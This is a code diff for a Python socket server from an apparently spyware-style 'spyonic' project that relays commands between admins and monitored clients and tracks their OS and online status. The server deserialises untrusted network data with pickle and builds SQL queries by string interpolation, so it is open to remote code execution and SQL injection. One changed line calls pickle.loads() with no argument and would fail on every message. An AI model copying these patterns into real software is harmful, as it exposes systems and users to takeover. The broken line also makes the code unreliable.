@@ -5,7 +5,6 @@ import threading
 import time
 import random
 from datetime import datetime
-import sys
 import os
 from nidhi import commands
 
@@ -84,7 +83,9 @@ class server:
 
     def clilistener(self,id,client,ev):
         while not ev.is_set():
-            data = pickle.loads(client.recv(2048))
+            data = client.recv(4096)
+            if data != b'':
+                data = pickle.loads()
             if type(data) == dict:
                 if data['command'] == 'sendadmin':
                     adminid = self.execdb(f"select id from spyonic.admins where email = (select email from spyonic.clients where id = '{id}')")
@@ -106,21 +107,24 @@ class server:
                 data = admin.recv(4096)
                 # print(data)
                 if data != b'':
+                    print('recving command')
                     data = pickle.loads(data)
+                    print(data)
                 if type(data) == dict:
+                        print(data['command']=='status')
                         if data['command'] == 'sendclient':
                             if data['id'] in self.clients:
                                 cli = self.clients[data['id']]
                                 cli.send(data['data'])
-                            elif data['command'] == 'status':
-                                email = self.execdb(f"select email from spyonic.admins where id = '{id}'")
-                                clients = self.execdb(f"select id, name ,status ,os ,last_online from spyonic.clients where email='{email}'")
-                                clidata = {}
-                                for client in clients:
-                                    clidata[client[0]] = {'name':client[1],'status':client[2],'os':client[3],'last_online':client[4]} 
-                                admin.send(pickle.dumps(clidata))
-                            else:
-                                pass
+                        elif data['command']=='status':
+                            email = self.execdb(f"select email from spyonic.admins where id = '{id}'")[0][0]
+                            clients = self.execdb(f"select id, name ,status ,os ,last_online from spyonic.clients where email='{email}'")
+                            clidata = {}
+                            for client in clients:
+                                clidata[client[0]] = {'name':client[1],'status':client[2],'os':client[3],'last_online':client[4]} 
+                            admin.send(pickle.dumps(clidata))
+                        else:
+                            pass
             except Exception as e:
                 print(e)
                 ev.set()
@@ -245,7 +249,7 @@ class server:
                         print(passwd[0]==data['password'])
                         if passwd[0] == data['password']:
                             print('passwd accepted')
-                            cli.send(pickle.dumps({'id':id,'error':None}))
+                            cli.send(pickle.dumps({'id':data['id'],'error':None}))
                             print('sent')
                             self.change_client_status(data['id'],1)
                             cli_ev = threading.Event()
